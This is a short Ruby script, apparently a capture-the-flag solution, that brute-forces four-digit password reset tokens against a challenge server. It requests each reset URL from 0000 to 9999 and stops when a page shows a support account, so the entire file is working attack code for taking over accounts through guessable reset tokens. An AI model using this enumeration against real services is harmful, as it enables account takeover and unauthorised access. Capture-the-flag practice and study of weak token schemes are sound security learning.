require 'net/http'

uri = URI('https://challenges.unitedctf.ca:12004')
(0..9999).each do |number|
  token = number.to_s.rjust(4, '0')
  print "\r#{token}"
  uri.path = "/password_resets/#{token}/edit"
  response = Net::HTTP.get_response(uri)
  if response.code == '200'
    puts "\n#{uri}"
    break if response.body.include?('Invoicer Support Account')
  end
end
